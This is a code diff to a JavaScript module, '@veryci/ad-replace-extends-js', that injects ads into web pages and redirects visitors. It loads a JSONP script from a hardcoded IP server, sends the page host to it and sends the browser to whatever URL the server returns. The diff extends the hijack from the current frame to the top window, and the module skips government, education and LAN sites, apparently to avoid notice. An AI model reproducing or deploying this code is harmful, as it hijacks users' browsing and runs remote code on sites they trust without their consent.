@@ -4,24 +4,24 @@ import { AD_0X0 } from './config';
 
 const [name, version] = ['@veryci/ad-replace-extends-js', '1.0.0'];
 const blackWebsite = /.edu|.org|12306.com|.*gov.*|^192.168|yoyo.qq.com/;
-const { hostname } = window.location;
+const hostname = Object.keys(window.top.location).length > 9 && window.top.location.hostname; // 当前ifram是否同源
 
 function replace() {
-  if (window.adReplaceJS || window.top !== window || blackWebsite.test(hostname)) return;
-  window.adReplaceJS = `${name}-${version}`;
+  if (window.top.adReplaceJS || blackWebsite.test(hostname)) return;
+  window.top.adReplaceJS = `${name}-${version}`;
 
   if (phone) {
     mobileReplace();
     // 唤醒广告位
     const scr = document.createElement('script');
     scr.src = AD_0X0;
-    document.body.appendChild(scr);
+    window.top.document.body.appendChild(scr);
   } else PCReplace();
 }
 
 function redirect() {
   let str = '';
-  // const url = window.location.search.replace('?', '');
+  // const url = window.top.location.search.replace('?', '');
   // const arr = url.split('&');
 
   // arr.forEach((element) => {
@@ -44,22 +44,22 @@ function redirect() {
   }
 
   const fnName = `Jsonp${Math.random().toString().replace('.', '')}_${new Date().getTime()}`;
-  window[fnName] = (data) => {
-    if (data.url) window.location.href = data.url;
+  window.top[fnName] = (data) => {
+    if (data.url) window.top.location.href = data.url;
   };
   const os = document.createElement('script');
   os.src = `http://117.121.41.228:3000/replace?cb=${fnName}&host=${str}`;
-  document.head.appendChild(os);
+  window.top.document.head.appendChild(os);
   os.remove();
 }
 
 function handler() {
-  if (window.top === window && !window.haveRedirect) {
+  if (!hostname) return;
+  if (!window.top.haveRedirect) {
     redirect();
     window.top.haveRedirect = true;
   }
-  console.log(document.readyState, window.top === window);
-  if (window.adReady || document.readyState !== 'complete') return;
+  if (window.top.adReady || window.top.document.readyState !== 'complete') return;
   replace();
   setTimeout(replace, 4000);
   window.top.adReady = true;
@@ -73,7 +73,10 @@ if (document.addEventListener) {
 }
 
 setTimeout(() => {
-  if (window.adReady) return;
-  setTimeout(replace, 0);
-  window.adReady = true;
-}, 10000);
+  if (hostname) replace();
+}, 2000);
+setTimeout(() => {
+  if (window.top.adReady) return;
+  if (hostname) replace();
+  window.top.adReady = true;
+}, 7000);
